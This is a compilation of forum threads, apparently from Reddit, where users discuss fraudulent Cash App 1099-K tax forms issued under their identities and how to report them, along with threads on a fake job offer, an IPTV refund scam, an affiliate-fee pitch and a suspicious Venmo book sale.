- Same. Just got the same 1099 and mine had the same merchant code for beauty salon and all 1,372 transactions were done in November only for a total of $21K. What is going on that so many people have the same form? Ugh...freaking fraudsters.
- Just be aware that if this form was sent to the IRS, when you do your taxes and you don't include that $34K - you may have IRS problems.
- Bad advice. Do not accept that. Escalate with CASHAPP.
- > told me to ignore it.

That IS helpful. Provided it actually really comes from the actual real Cashapp.
- Seems pretty helpful to me. I'm not sure how saying that they have nothing to indicate it came from them is unhelpful, tbh. That seems to clear up a ton.

Is there anything on your credit? No? Then ignore it.
- yes this was my first thought.
my second thought was OP gave away too much personal info on a fraudulent rental application with all the fake apartment listings these days and got their identity stolen
- My mom says hi
- You can file the identity theft report online in SD: [https://www.sandiego.gov/police/services/file-police-report#can](https://www.sandiego.gov/police/services/file-police-report#can) Also, consider email Scott Peters. If everyone effected in this thread emailed him, I suspect you'd get his attention.
- It's happened to a lot of people. This isn't about revenge thing it's a Cashapp has garbage security and vetting thing or it's just a fake attempt at fraud
- I bet your TIN number is 80-0429876

- My wife just got one with her maiden name too.
- I also experienced this! The card I received in November wasn't even my Cash App account. Then I received this in the mail yesterday‚Äîa charge of $70 in November and $21,600 In December.
- They didn‚Äôt help me! Called them today & they basically said they created a case # (I gave them no personal information so not sure what the case # will do) & said they can‚Äôt do anything because I dont have any account information
- Do you do business with Wells Fargo or Mr Cooper?
- What is CFPB? Going through same issue
- It's insane and nothing can be done im worried I will have this problem every year as they will continue to use cashapp account linking to my social security number
- Yes, i was also told they couldn't look any accounts linking to m information. I recieved a cashapp card in the mail a few months ago and it had a different cashapp username on it. They wouldn't even tell me the transactions on it because it wasnt associated with my number or email.
- I also filed a police report. I called the IRS, and they said to call back after February 15th so they could see it in the system. Do we still file taxes with the form???
- You can do that online: [https://www.sandiego.gov/police/services/file-police-report#can](https://www.sandiego.gov/police/services/file-police-report#can)

Also, email Scott Peters. I'm pretty sure if everyone in this thread sent him an email, he'd start looking into it aggressively: [https://scottpeters.house.gov/email-me](https://scottpeters.house.gov/email-me)
- They have been of no help at all they are a joke
- We couldn‚Äôt reach a human to talk to. We were told that they only have live customer service for  account holders. And since we don‚Äôt have an account (that we know of), they couldn‚Äôt do anything for us. It was a futile  conversation.
- Yep your situation is same as mine you will get nowhere with them please let us know if you have any luck calling tomorrow I did not but calling back again tomorrow as chat support was useless
- Mine was 350 transaction in november and I was in restaurant business..smh
- Also file a report with consumer financial protection bureau ASAP as well
- (Reposting to make sure people see it.) Follow all of the good advice above for reporting the fraud to the police, the IRS, and to the FTC. Also, email Scott Peters. I'm pretty sure if everyone in this thread sent him an email, he'd start looking into it aggressively: [https://scottpeters.house.gov/email-me](https://scottpeters.house.gov/email-me)
- It's nice that they're being held accountable and will finally have to do more to protect their users. I was defrauded on Cash App last year, and they didn't do anything to get my money back. Maybe now, they'll have to actually take fraud more seriously.

- i could be wrong but i think cashapp falls under CFPB‚Äôs jurisdiction not FTC as cash-app is a banking service. I tried to submit a report with FTC but it directed me to CFPB

Sidenote: Block inc had an enforcement action levied against them by CFPB for this crap last week. I filed a report through them which supposedly goes to block inc and guarantees a reply from Block Inc within 15 days. 

I am going through the same situation

Link:
https://www.consumerfinance.gov/about-us/newsroom/cfpb-orders-operator-of-cash-app-to-pay-175-million-and-fix-its-failures-on-fraud/
- Probably a dumb question, but what is the cash app support email? I want to keep record via email as well
- Do you have an actual email address?
- Problem is we don't know the account to close the only account showing for me is my personal account which was not used and is closed someone opened business cashapp account and is performing business under our name and social which is why we are getting these.. cashapp will not lookup social to see if any other accounts are under your name to close
- I'm happy to hear that. I've been getting the runaround though have an open email chain on which I provided my FTC case number.
- It's insane and no way to stop it from happening this year and getting another 1099k for 2025 because they won't find the account and close it being used
- I'm meeting with my tax attorney Monday and we'll be submitting a subpoena if necessary and possibly taking additional action if it's determined Block Inc didn't perform the necessary due diligence in vetting people creating new financial accounts per the federal and state regulations they're subject too (which California has very strict rules for validating identities in financial transactions).¬† I'll post an update after more information is obtained.
- Good luck i have received all.the same back as well and requested a corrected 1099K so far no luck! Keep us posted
- May I ask which box(es) you checked on the IRS form #14039 under Section B? I don't believe anyone has attempted to file a return under my info yet, but I know this is tax-related.
- I wouldn‚Äôt post this un-redacted.
- I received the same exact thing today. I called Cash App and they told me there‚Äôs nothing they can do for me (which I don‚Äôt understand) but that they would cooperate with police if I file a report. So I called my local police department and an officer came to my house to look at it. The officer thought it was a scam because it was on such thin paper and it only showed the last 4 of my social security number. But the only big question mark is what would the scammers motive be? There‚Äôs no bait, like a phone number or website, they are trying to lure me into. The officer recommended to ignore for now, but just hold on to it and see if anymore red flags come up in relation to it in the future.
- Delete this before you get scammed again lol
- Curious as to what info you needed to file police report I have already filed with FTC and CFPB
- Thanks for listing this out; I‚Äôll plan to follow the same/most (if not all) the same steps. I also question the authenticity of the form, but I‚Äôm also treating it as a real 1099-K.
- Make sure you go file with FTC and CFPB as well
- It says cash app right on it.  Cash app is owned by Block, which what Square changed its name to.  None of these are owned by PayPal.
- But it can‚Äôt just be ignored, right?
- You might also talk to someone at Square/Block (Block owns Square and CashApp). There's an account somewhere in their portfolio that's taking money in your name.
- I got one in the mail today as well! Im going to call then and see whats up
- Here's a guide from r/identityTheft called "identity theft recovery 101" that covers the basics of credit freeze, IRS pins, even replacement SSN and police reports: 
https://www.reddit.com/r/IdentityTheft/comments/pqb1za/identity_theft_recovery_101/

Also a step by step on freezing your credit, which is not as simple when you're in damage control mode: https://www.reddit.com/r/IdentityTheft/comments/uvv3ij/psa_freezing_your_three_main_credit_reports_is/

Then freeze your DEBIT line with Chex Systems (virtual debit cards usually don't check credit reports) https://www.chexsystems.com/security-freeze/place-freeze

Freezing one's credit is a good idea whether you got scammed or not. Everyone should have their credit reports frozen, always. It takes minutes to freeze, and minutes to unfreeze. You only need to have it unfrozen when you open a new bank account or credit card, things like that. You can start the unfreeze on location while you wait to talk to a rep. It's a no brainer.
- That's great for you, but OP should not assume he is in the same boat. Until OP speaks with an actual rep from the IRS he should assume he will be held liable for that money, whether he actually recieved it or not.  Contacting CASHAPP and the IRS in that order should be a priority.
- How exactly did they tell you about that 20k interest? Because I'm really confused how they could contact you, yet have no record of you?
- This is totally different. When you ‚Äúmade money off interest,‚Äù that means an account to accrue interest was there presumably in your name as well, and when you called, they may have noticed the error and given you the runaround like you said. Hence, if the IRS went for this, you could assume they would tell them it was an error.

Here, if someone indeed used OPs SS to link payments/income too, if CashApp is like ‚Äúyes, we gave that money to OP,‚Äù OP is likely screwed owing thousands of dollars of interest. There‚Äôs a good chance that the bank account this money was going to is closed too, and in that case, it becomes hard to prove OP didn‚Äôt receive the money.

This is what my cashapp says
- 1099 forms are for more than just contractors.  They are used for Social Security, pensions, interest, dividends, goods and service - and this year there will be one for digital assets 1099-DA.
- I'm not a independent contractor, and I get all sorts of 1099 forms. You'll get them for any money you earn outside of your job.
- Have you helped a friend set up an account to take credit cards? Or a business you worked at? This particular form is used for credit card transactions through Square. That merchant code is for restaurants and eating establishments. Did you help someone set up to take credit cards, maybe a food truck or a friend selling homemade desserts or goods?

Perhaps file a police report. They won't do anything, and they may be reluctant to do it. Tell them you realize it may be impossible to find the person, but you need the report to file your ID theft claim with the  IRS. You don't need it, but the IRS has seen thousands upon thousands of people try to claim ID theft to get out of paying a tax they owe. This adds more weight because if you are lying, there is a potential for a criminal charge of filing a false police report. 

Change all of your financial passwords.

Scan your computer and phone for malware.  Remove unnecessary apps and programs.
- There should be some record in cashapp of who made the payments. Investigators should be able to contact the payers and get information about the reason for the payments and who they thought they were paying
- I‚Äôm in the same boat unfortunately. What option did you select on the Identity Theft Gov website under ‚ÄúWhat did the identity thief use your information for‚Äù option? I don‚Äôt know which one to select.
- Got an almost identical 1099-K today. Don't use CashApp. Will be following your journey and beginning mine down the same path. So annoying.
- Keep us posted on your journey and if you make any progress with CashApp? I think a few of us are in a similar boat.
- This is happening to a lot of us and it started in December 2024.¬†


Cashapp new about it and called us gambling junkies instead of protecting our information.¬†


We were issued a SECOND FRAUDULENT debit card with a new $NAME and Now we are receiving a 1099k that is being filed with the IRS!!!!! Who is going to file this class action lawsuit????
- This happened to me:   I just had 2022 IRS audit and Block inc reported they paid me $23,156 which is false. I filed a fraud report with IRS and FBI fraud division. If you Google Consumer Financial Protection Bureau you will see that they just won a judgment with Block Inc fka Square and owner of Cash App for $175M, they have to repay consumers $120M and find $55M to Consumer Financial Protection Bureau due to the company's lax compliance. We are not consumers in this situation. We are clients of Block Inc fka Square and owner of Cash App. I filed a complaint with Consumer Financial Protection Bureau (CFPB) which was tricky bc I tried to explain to them that I am 'client' of Block Inc (etc.) and how can their Bureau protect the number of clients of Block, Inc etc. They took my claim and sent my complaint to Block Inc for response. If we all file claims, I'm hoping Block will be taken to task for not only treating customers wrong, but we the client. I've read many people saying why did Block Inc send a 1099 for more than what their records show. Plus clients like me that has no open account, no website to review transactions, Never had Cash App. I also sent a letter to Block Inc along with copy to IRS and FBI Fraud division. I also read on google a news agency report on 5/1/2024 they were being investigated for money laundering and something to do with crypto. I'm 73, retired and care for my husband 24/7 since 12/25/2020 when he had 6 strokes while ventilated for Covid; has permanent vision impairment, vascular dementia, impulse control and aphasia issues. Oh, I also filed a report with the FTC Federal Trade Commission because they audit financial institutions because they have to have compliance dept., which Block Inc wasn't using properly.
- File with Consumer Financial Protection Agency.
- I received my Cash App 1099-K in the mail today, so I'm not sure that rep's statement was accurate.
- Unfortunately most of that wouldn't have helped in OPs case. Anything else?
- All the IRS, FTC, SSA, and credit bureau stuff you can file online, so that wasn't too bad.  My main concern was UBER having my information and it's impossible to get a live person for my issue, even after downloading the app and getting in-app help. I eventually found an UBER online form asking for pictures of my ID and stupid shit as if I should trust them with my personal info.  They are horrible at vetting drivers and apparently this has been going on for 5+ yrs resulting in class action lawsuits
- Do you have an online account with the IRS? If not, please create one and also request a PIN code for your tax return.
- Somebody stole your identity :-(
- Did you find out what happened? I just got the same thing. I contacted the company Block Inc/ Square to correct the 1099k to zeroes because this is fraudulent data. I also contacted the IRS and the credit bureau regarding the fake 1099.
- You got further than we did with Cash app. They have a phone number but it‚Äôs only for customers/clients who have a cash app account so since we don‚Äôt have an account they say they can‚Äôt help us. They told us to write an email.
- An abundance of illegals if I had to guess
- Yeah, I had this happen at the company I worked at last year.

Someone sent out 1099s from ‚Äúus‚Äù but the only thing that matched was the name.  The TIN wasn‚Äôt even close and given that I sent all the 1099s out myself, I knew it wasn‚Äôt valid. 

I am still not sure what the scam was trying to achieve.  The only thing I could think of was to get people to call into them from the form and give them personal details.
- They didn't say they have nothing to do with it, just that they cannot check their system to confirm whether the information I received is real or not.
- Why would income you receive show up on your credit report?
- ‚Äúignore it‚Äù is terrible advice. if this 1099 was also filed with the IRS, they‚Äôll be looking for their cut of the 30k they think OP was paid. (why would this show up on OP‚Äôs credit? it‚Äôs not related to a credit account.)
- Its 86-75309
- Yep. Just got one of these today and the TIN number on mine is exactly the same aa yours.
- Same one here too
- Checked ours too and nothing
- FYI- there is an account number on the bottom left of the 1099K if you received one.
- Nope. Neither.
- Why? Is there a correlation? If so please let us know‚Ä¶
- My mortgage was recently transferred to Mr Cooper.¬† Did they have a breach?
- Shorthand for ‚ÄúConsumer Financial Protection Bureau‚Äù

They are one of the government agencies that sued and levied an enforcement action Against Block Inc - detailed in the URL i shared above. 

You can file a complaint with CFPB against Block here:
https://www.consumerfinance.gov/

Full disclosure- not sure if it will actually do anything but i didn‚Äôt know what else to do and just found this thread today. Hopefully someone else can shed some light.

I will be sure to report back if anything positive comes out of it.
- Someone posted a good guide in the comments on what to do. There was another form (a 1040?) that would help when filing if you did the rest of the steps.
- Follow all of the good advice above for reporting the fraud. Also, email Scott Peters. I'm pretty sure if everyone in this thread sent him an email, he'd start looking into it aggressively: [https://scottpeters.house.gov/email-me](https://scottpeters.house.gov/email-me)
- Thanks for the follow-up, and that's really good to know the difference! I submitted a report to the FTC based on steps from the IRS and will definitely be submitting through CFPB today or tomorrow. I'm curious about that form and had asked elsewhere about how to complete. I selected "Money transfer, virtual currency, or money service" but wasn't sure whether to select "Mobile or digital wallet" or "Virtual currency" after that. I did read about that yesterday and couldn't believe it. I'm in for class action suite if this gets that far. 

Side note: I'm sorry you're getting nowhere with Cash App either. What a joke.
- No dumb questions here: [emailsupport@cash.app](mailto:emailsupport@cash.app)

EDIT: This is the email address I received an email from after asking to speak to a manager when I was speaking with someone via phone. I gave them my email address and they followed up. I then received a survey from this address asking me to rate their support.
- [emailsupport@cash.app](mailto:emailsupport@cash.app)

EDIT: This is the email address I received an email from after asking to speak to a manager when I was speaking with someone via phone. I gave them my email address and they followed up. I then received a survey from this address asking me to rate their support.
- The 1099k you received has an account number in the bottom left. Whited out in the screenshot on this post.

I used it when talking to support, which ofc went nowhere. (They are not replying to my emails with the case that opened)
- Updated my post, they were just as unhelpful.
- This is exactly what I'm worried about. Keeping an eye on this sub has been super helpful.
- Let your tax attorney know that you're not the only person dealing with this. If they're any good, there might be some people in this thread that will need to find someone to work with.
- I submitted the online form and said that I have ‚Äúother issues related to my federal tax return‚Äù
- I'd still file all of the paperwork suggested in the good advice above. Also, email Scott Peters. I'm pretty sure if everyone in this thread sent him an email, he'd start looking into it aggressively: [https://scottpeters.house.gov/email-me](https://scottpeters.house.gov/email-me)
- They used your identity to run a business or launder money without paying taxes. You're on the hook for the taxes if the IRS gets a copy of that 1099
- I showed them the tax document and explained the situation; they just had me fill out the report itself, in which I repeated what happened. I provided dates, Cash App info, and all the steps I've taken. I also included the information Cash App support is giving out for law enforcement to reach them. Because someone else in my area had already filed a report, they didn't need to make a copy of my document, but they might want to with yours.
- I agree. There‚Äôs a comment above from a tax pro that explains what to do. And I just got off the phone with my cpa and she said the same thing. Other than that you can clearly tell it‚Äôs a scam. They are getting annoying these scammers, but they are also making rookie mistakes where I just laugh at this point.
- Also look at the TIN number. Bet were twinzies.
- Got one last night. So far they‚Äôre being pretty useless aside from saying that they‚Äôd cooperate if there is a police report. I just want a corrected 1099 and to somehow block them from using my SSN for anything in the future
- I contacted the IRS and they really didn't do or say anything helpful
- The 1099 is from Square and not from Cashapp. Square is used as a point of sale processor. Likely somebody set themselves up as a merchant and used the OP's SSN.
- The form says 998 transactions in September, and September only. Very odd.
- That applies to an individual account. This may be for a business or 3rd party account.
- 1099-K is for payments for goods or services. There are ones with different suffixes, true
- I get them for reffing soccer.
- I co-signed for a friend's college loans 7 years ago but I don't think that would be related to this. None of the jobs I've worked have ever used square for payments. I am familiar with their platform and have used my card to purchase things with their terminals.

I will go ahead and file a police report just to have the additional documentation/support with my case. Appreciate you a ton!
- If it was Cash App to pay for restaurants and eating establishments, then he/she can file a form to get $2500 with the Consumer Financial Protection Bureau.  They just won a judgment from Block Inc for $175M, plus repay customers up to $120M and $55 fine to Consumer . . .  Look the Bureau up to find out how to file for reimbursement.
- I mean, not really? If someone wants to steal your identity, it's not difficult to do sadly. As you say, all that stuff is available publicy for most people at the touch of a button.
- There are several cases of fraudsters selling identities to illegal aliens and people unable to pass background checks (criminals) so that they can get gigs with Uber and others. This has been going on for some time.
- How did you contact them? I can‚Äôt find a number to call‚Ä¶ you got it?
- Did Block help you? I am in the same situation.
- Cash app isn‚Äôt communicating with anyone anymore. They are just sending out generic emails when you call and talk to them claiming they can‚Äôt find your account without a phone number or email address on the account (which won‚Äôt be your info). I told them it was funny they can issue my wife a 1099 but can‚Äôt locate the account. It‚Äôs all a joke.

File a police report and an identity theft report and get a tax pin #. We are going to be reaching out to a tax attorney most likely as well.

https://preview.redd.it/q41udbgue6fe1.jpeg?width=1170&format=pjpg&auto=webp&s=00f077d01d298d7b2516a19381adbeac279b826f
- It might be a mistake from a business because apparently only business accounts are supposed to receive a 1099-K form, and they might have corrected the error for the later months but income for September is still associated with your SSN. It might also be possible it is an identity theft and the best option at the moment is to secure your identity. From what I have found, the first thing to do if you receive a wrong 1099 form is to re-contact  CashApp again and ask for a supervisor or the fraud specialist to fix this issue.

https://www.irs.gov/newsroom/actions-to-take-if-a-form-1099-k-is-received-in-error-or-with-incorrect-information
- Well I guess they were smart to change some. But me and op‚Äôs are the same. Which is funny. No one has the same tin number. But regardless it seems the irs is going to have fun this year with these. Unless you know what you‚Äôre doing file with a cpa. You need to report it and state it was sent in error. Also if you haven‚Äôt get a pin from the irs. Because well welcome to the stolen identity club.
- Also, a tin number is a 9 digit number. Yours is only 7. üëÄ
- I did! I will call back and give them this information & see if this will help. THANK YOU!
- My 1099K had my middle initial - which I never use. Only Wells Fargo and then Mr Cooper have that - so I‚Äôm wondering if there was a breach - I have an idea where it may have come from
- I just filed complaint as well guess it can't hurt this is a nightmare
- Completing this soon. On the form, did you select "Money transfer, virtual currency, or money service" and then "Mobile or digital wallet" or "Virtual currency"? I was thinking "Virtual currency."
- Anytime-

Not an expert but i did ‚Äòmobile/digital wallet‚Äô since cashapp just stores USD in an account like an online bank. I understood ‚Äòvirtual currency‚Äô as a crypto non-USD wallet.

At this point the more noise this generates the better. I‚Äôll join that class action with you lol. This is so annoying and has to violate some sort of ‚Äòknow your customer‚Äô banking laws or something. No alternate form of ID to open a ‚Äòbusiness‚Äô debit account sounds like a money laundering ring.
- Yea i seen that but I'm like you getting nowhere with support so that number really is not helpful..ugghh
- Thank you so much!
- Great thanks for the info!
- Also to boot, YES this will be reported to the irs under ‚Äúyour name‚Äù. But that is why it‚Äôs important to have an identity theft personal pin that is given to you from the irs. There‚Äôs probably 50 people a year filing taxes using my identity but since I have the secret pin they give me(new pin every year)they know I‚Äôm the right person.
- Twins! What are the odds?!
- Will you be filing a police report? I know everyone says to contact the police in these instances but I never understood how much they could actually do.
- Well that doesn't mean they can't help OP. If I get something like this, I'm damn well gonna call everybody till I am certain my ass is covered.
- Wow. That is worse than the one we received.  All deposited in December over 382 transactions.
- Your reffing job is an independent contractor job.
- I agree with everything you said. What sucks is out of everything I check, my actual physical mail I check least frequently of everything. Now I know I need to keep an eye on that too
- Just had the exact same thing happen to me and the Filer's TIN was 80-0429876. Dreading what comes next
- No problem and good luck! 

I‚Äôm in the same boat and livid about the situation.
- I'm going through same thing I had a personal cashapp but never used it but once it's closed someone opened a cash app business under my name some where received 1099k for $8,000 cashapp support is providing no help at all i don't know what to do i filed report with identity theft site but that's not helping resolve the issue it's been a nightmare for 2 days and have gotten nowhere
- Copy. I use them both too‚Ä¶ the 1099 i got actually only had half of my last name. Wells and Mr C. Have my full last name‚Ä¶ so I don‚Äôt think it‚Äôs correlated with Wells and Mr C. Plus i only got with Mr C a few months ago
- I think i did money transfer then mobile/digital wallet since this is all in USD.

‚ÄòVirtual currency‚Äô sounds like crypto
- Yeah sorry this is happening to you as well. 

CFPB levied an enforcement action against cashapp a week ago for this very reason. support straight up doesn‚Äôt do anything about it. Link below. 

You can try submitting a report through CFPB if you think it fits- it sounds like CFPB are aware of the issues at block/cashapp but they may not know how deep these issues run.

https://www.consumerfinance.gov/about-us/newsroom/cfpb-orders-operator-of-cash-app-to-pay-175-million-and-fix-its-failures-on-fraud/
- Yw!
- Which TIN number? The Filer's or the Payee's? The Payee's number is redacted in OP's picture.  Wouldnt the Filer number be the same if it's all from Block, Inc.?

I just received one of these today from Block/Cash App. Same situation. Have never used Square or Cash App.
- Happened to my MIL as well. Doesn't matter if they can do anything. You need it as a part of your evidence that this is fraud and that you have communicated the problem to everyone possible. You can file a report online for identity theft in SD: [https://www.sandiego.gov/police/services/file-police-report#can](https://www.sandiego.gov/police/services/file-police-report#can)
- Mine is 12, 736$ in December and there's no way that's correct.
- Assuming you live in the US, sign up for Informed Delivery with USPS. You get a daily email with scans of every envelope so you can see what‚Äôs coming. Something like this would say ‚ÄúTax Document Enclosed‚Äù or similar on the envelope.¬†

https://www.usps.com/manage/informed-delivery.htm
- Seems everyone is getting them. There‚Äôs nothing to dread. It may seem concerning if it‚Äôs your first time dealing with something like this but don‚Äôt loose sleep. Your identity, like ours has been compromised. The only steps you need to take is freeze your credit, and get a pin from the irs. 

I‚Äôd suggest you get something like lifelock. It‚Äôll monitor your stuff. The main thing I had to deal with was people opening bank accounts in my name. Then there‚Äôs the other, getting cable, opening phone lines etc. been dealing with it for years. 

If I had to guess what‚Äôs going on right now is that last year it was a busy time for illegals. Again this is me taking a salty ass guess. But they wanted to work but don‚Äôt have socials so they got paid and we‚Äôre dealing with their reported income. But there‚Äôs also the fact that a lot of us have the same tin number. Which screams scam. Anywho just Give it to your cpa when you file and tell them this is not you and have a fun chat about this Reddit form. Who knows they could have gotten one too. But they‚Äôll report it as sent in error. You‚Äôll be fine.
- Yes I opened case with them as did others on this post I don't know if it will help and also opened case with identity theft.gov which is who SSA refers you too on their site
- This was my thought as well (that the filers  number would be the same because the filer is Block).
- Yes you‚Äôre correct. It‚Äôs just a case of we have all been had. The irs is going to have fun with these this year.
- Thanks! I filed last night and added it to my FTC report.
- Yes. You‚Äôre right.
- I'm a little confused. The Payee Tin on the document I received is my SSN and the Filer TIN matches the one on this post.
- Awesome. I'm trying to post the link all over this thread, so that people know its something they can accomplish quickly. I'm also suggesting that people email Scott Peters with their stories and a link to this thread: [https://scottpeters.house.gov/email-me](https://scottpeters.house.gov/email-me)

Someone below also shared an email address for CashApp Support. I don't know if it works, but I'll post it here as well: [emailsupport@cash.app](mailto:emailsupport@cash.app)
- Thank you!!

I'm out of state, but would it be helpful because he's the rep for the state in which Cash App is located?

It was me and they've gone silent. Still, if people try and save the record, it could be helpful. I included my emails on the CFPB report.
- Lol. Sorry about that. I'm not paying attention. I am now aware of several people in San Diego who are dealing with this, and I totally forgot to check to see whether this was an SD thread. Its obviously not.

Instead you might consider reaching out to a "local" (i.e., for Oakland) news team, like East Bay News.

General: [local@bayareanewsgroup.com](mailto:local@bayareanewsgroup.com)

Business and Tech News: [business@bayareanewsgroup.com](mailto:business@bayareanewsgroup.com)

Could still reach out to them with a brief version of your story and a link to this thread. (We'll be doing it once we get a little further in the complaint process. Want to get everything documented and to pursue things as far as we can with CashApp first).

- This will end up as a !fakecheck

You can smell this scam from a mile away. No HR rep would ever write in such stilted, awkward English. Literally not a single substantive thing about the work the job entails either. It's also an employers market - no one will give you the choice of full or part time for some low level, unskilled job.

Let me guess - you've never actually had a phone or zoom call with these people?
- "We will be offering you a payout of $24 per hour. If you choose Part-Time position you should work 20 hours per week at any time between 9 am - 5 pm." That's an unusually high starting salary for a remote position! Not to mention the ability to set your own hours? A legitimate company would set the hours they expect you to work, not the other way around. 100% scam.
- remote = scam
- 1. Their response to your application is worded as if you are aldready hired.
1. No HR person will be supervising non-HR hire.
1. They want you to sign an "employment agreement" to process "your registration". You are not even interviewed yet.
- Yea exactly, that was one of the red flags. Like they immediately accepted my CV? In less than an hour after I sent it lol...  
  
They said there will be a phone interview once I accept the job offer but its very fishy!
- Hi /u/CIAMom420, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Yea, I am realizing it is too good to be true. From starting when I want to the wages for an unskilled job position.
- No companies operate like this. You'd be fighting with 1,000 other people for a remote, unskilled customer service job. The fact that they just handed it to you is one of about eight-dozen red flags.
- Yea 100%, I have googled the company and tracked the address. Its some suburban house area and a semi-dead domain for a company......

Only worry is I download a PDF form they attached.

Title: Scam-IPTV named NAVYA IPTV
Body: Recently, I subscribed to an IPTV service called NAVYA IPTV (six one eight-three seven four-zero one eight one) based on a friend's recommendation. I also shared their phone number earlier in this post. I paid $110 for a 2-year subscription, and they conducted a WhatsApp video call to explain the service and guide me on activating the portal. Initially, the portal worked fine, but after a few days, the link stopped working. 

When I called for support, a group of indian  women answered, heckled and provided generic troubleshooting steps, like restarting the portal, which I had already tried numerous times. When I requested a refund through calls and messages, they started ignoring me, never returned my calls, and didn‚Äôt process the refund. 

It‚Äôs now been six months of fighting for my refund without any resolution. I‚Äôm sharing this experience to warn others not to fall for this scam. Their phone number is posted above‚Äîif you receive a message from them, be cautious and avoid engaging.

Title: Has anyone heard of Taskynet or their product SpeedeCam?
Body: Hello everyone,

I recently attended a free event in London where a mentor showcased some interesting AI tools. They introduced their company, Taskynet, and one of their main products, SpeedeCam, which they claim is an AI tool for e-commerce that enhances product photos to look like they were taken in a professional studio.

They‚Äôre looking for affiliates to promote and sell their products, offering commissions in return. However, they‚Äôre asking for a ¬£100 upfront fee, which they say includes access to training and a license for some of their tools.

Has anyone heard of Taskynet or had any experience with their affiliate program or products? I‚Äôm trying to figure out if this is a legitimate opportunity or something to be cautious about.

Thanks in advance for your insights!

- Sounds like a multi level marketing/pyramid scheme. If you're going to put all this effort into selling it, why not get a real job where you will have a wage?
- I would stay away several of the services they offer are on they offer are on the scamy side. (Dropshippping, ecomerance training).¬†


I can't find any reviews online for them good or bad. I know every business has to start somewhere but yeah I would still avoid them.

- Thanks for the response , but i already have a job just asking about their products and if they are legit.
- Thank for the advice bro , same from my side I didn't find anything related to them in the Internet this is way I posted this post , so if it's a scam other people finds things about it . 

If I am a tech company and I have such great products I won't hire people randomly from free events I rather build strong team and focus in good marketing in social media.

Title: FB Marketplace buyer already Venmoed me then requested me to ship the books
Body: Selling law school casebooks on FB marketplace. The buyer very quickly sent me the money on Venmo, tagging it as a payment for goods or services. They paid slightly extra so that I received all of the money I requested despite Venmo‚Äôs minor fees for ‚Äúbusiness payments.‚Äù

After paying me, they asked me to ship the books and sent me FedEx shipping labels. There are two shipping labels, supposedly because they specifically need one of the casebooks soon but are merely interested in the others. The two labels have different From and To addresses. Both addresses are in the US.

Their facebook profile has existed since 2020, they have 4 friends, and their only post is a profile picture (a flowery bush) uploaded in 2023.

Their Venmo username is completely different from their facebook profile but both names clearly come from the same region of the world.

There seems to be something sketchy going on here, and I‚Äôm concerned that they‚Äôll try to get their money back from Venmo or that they‚Äôre using a stolen card (and thus the money sent to me will get retracted). I can‚Äôt simply refund them yet because (1) it seems that the transaction isn‚Äôt fully completed (it says it‚Äôs completed on the Venmo app but there is no refund button appearing) and (2) I would rather not have to eat the (admittedly small) business transaction fee.

Is this as fishy as it seems to me? I‚Äôll be contacting Venmo support in the morning regardless.


EDIT: Venmo has helped me refund the money they sent. Thanks for the reassurances.

- Since you're selling textbooks for school specifically, I'd wager that your FB buyer might also be selling the same books on eBay or Amazon for more than you're selling the books for. 

But yeah, there's a chance that textbooks are also like currency since of how much they are worth, and he's also using a stolen venmo/bank/credit card amount to pay for them. They sent you shipping labels so they can control the entire shipment, i.e. you couldn't attempt to redirect/return them if/when the venmo charges back.

The problem... now is that you can't and shouldn't just send him back the money, you need venmo to actually refund/reverse the charge.  I'd probably just confront him head on, and be like, "Dude, none of these names match, what's going on."
- I had someone give me a sob story about books I was selling on Marketplace. Her son was autistic or something‚Ä¶ I can‚Äôt remember. I was too nice and didn‚Äôt charge her extra for the shipping. She filed a claim and got her money back. PayPal didn‚Äôt care that I had the tracking number and it showed delivered. I‚Äôd be careful
- If it smells fishy, don't go forward.
- A goods and service payment being sent to a different address is the perfect recipe for an automatic refund. The buyer will state that they never received.  You will have no proof that you sent to the buyers address.  
You will be out the books and out the money.
- If you ship using their labels how can you prove you actually did ship if they accuse you of not shipping and wanting their funds back.  

Or the buyer sold the books to someone else and you are drop shipping for him.  

Either ways the situation is unusual and sketchy.
- >They paid slightly extra so that I received all of the money I requested despite Venmo‚Äôs minor fees for ‚Äúbusiness payments.‚Äù

Paying more than the listed/agreed price for any reason is a red flag, especially if they mention ‚Äúbusiness fees‚Äù or something similar. This may be a fraudulent payment.
- Overpayment and especially diffrent name on recipient/FB name  and payment sender info is big red flags.
- There are too many ways this can go sideways and cost you.  Venmo could be reversed for any number or reasons, including, stolen payment method on the buyer's end, or a claim that you didn't ship... hard for you to prove you did, when he's providing the shipping labels AND that they're being shipped to someone other than the person that paid you with Venmo.  Just... yeah... nah.  Too slippery.
- I was fully willing to accept the reselling (I have really underpriced them to get rid of them), but you‚Äôre absolutely right about everything else. Is there anything to gain/lose by confronting them before speaking with Venmo support?
- Kinda up to you, if you're fine with the reselling idea, and they are just honest with it all, and send you links to the auctions or whatever or their real FB account, then I might be more willing to let it slide.

But yeah, whole thing is kinda shady, I'd prob just get out of it and then re-list on ebay for their proper value.
- It‚Äôs against terms on eBay to resell inventory not in stock. That‚Äôs not your issue. 

I‚Äôm guessing it‚Äôs some kind of text book dealer. As long as it‚Äôs G&S you‚Äôre mostly protected however not from Venmo. It has to be PayPal from my understanding.

Title: Fedex sent me something i didn't order
